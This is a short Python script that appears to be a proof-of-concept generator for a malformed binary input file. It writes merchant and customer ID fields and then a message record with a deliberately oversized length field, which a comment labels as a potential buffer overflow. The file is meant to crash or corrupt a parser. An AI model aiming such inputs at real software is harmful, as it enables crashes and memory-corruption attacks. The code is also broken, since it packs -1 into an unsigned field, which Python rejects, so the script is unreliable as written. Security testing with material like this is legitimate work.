import struct
import sys

data = b''
data += b"A"*32  # Merchant ID
data += b"B"*32  # Customer ID
data += struct.pack("<I", -1)  # One record
# Record of type message
data += struct.pack("<I", 9999)  # Set a large, incorrect record size (potential buffer overflow)
data += struct.pack("<I", 2)  # Record type
data += b"xxxxx"*32  # Message data

f = open(sys.argv[1], 'wb')
datalen = len(data) + 4
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()
